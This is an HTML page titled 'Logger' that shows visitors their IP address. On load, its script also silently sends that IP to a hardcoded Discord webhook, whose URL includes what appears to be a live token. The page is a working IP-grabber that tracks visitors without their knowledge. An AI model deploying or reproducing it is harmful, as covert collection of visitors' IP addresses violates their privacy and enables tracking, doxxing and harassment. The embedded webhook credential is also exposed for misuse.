<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Logger</title>
  <style>
    body {
      background-color: #111;
      color: #0f0;
      font-family: monospace;
      text-align: center;
      margin-top: 100px;
    }
  </style>
</head>
<body>
  <h1>Your IP is:</h1>
  <p id="ip">Loading...</p>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1362204715005251675/i7o9dGLluaS1H95w6r3-vkHs07wVhccFVY1PrXZA_lc0Hp8zhSTyaJDYleTasWDaO3aE";

    async function logIP() {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        const ip = data.ip;

        document.getElementById("ip").innerText = ip;

        const payload = {
          content: `üì° **New visitor**\nüåç IP: \`${ip}\``
        };

        await fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });
      } catch (err) {
        document.getElementById("ip").innerText = "Failed to load IP.";
        console.error("Failed to log IP:", err);
      }
    }

    logIP();
  </script>
</body>
</html>
